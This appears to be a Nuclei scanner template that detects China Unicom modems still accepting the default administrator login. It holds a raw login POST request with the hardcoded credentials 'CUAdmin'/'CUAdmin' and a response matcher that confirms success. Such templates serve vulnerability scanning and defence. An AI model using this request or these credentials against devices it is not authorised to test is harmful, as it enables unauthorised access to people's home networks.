id: chinaunicom-default-login

info:
  name: China Unicom Modem Default Login
  author: princechaddha
  severity: high
  description: Default login credentials were discovered for a China Unicom modem.
  classification:
    cpe: cpe:2.3:a:chinaunicom:chinaunicom:*:*:*:*:*:*:*:*
    cwe-id: CWE-798
  metadata:
    max-request: 1
    vendor: chinaunicom
    product: chinaunicom
  tags: chinaunicom,default-login,vuln

http:
  - raw:
      - |
        POST /cu.html HTTP/1.1
        Host: {{Hostname}}

        frashnum=&action=login&Frm_Logintoken=1&Username={{username}}&Password={{password}}&Username=&Password=

    attack: pitchfork
    payloads:
      username:
        - CUAdmin
      password:
        - CUAdmin

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302

      - type: word
        name: chinaunicom
        cpe: cpe:2.3:a:chinaunicom:chinaunicom:*:*:*:*:*:*:*:*
        words:
          - "/menu.gch"
        part: header
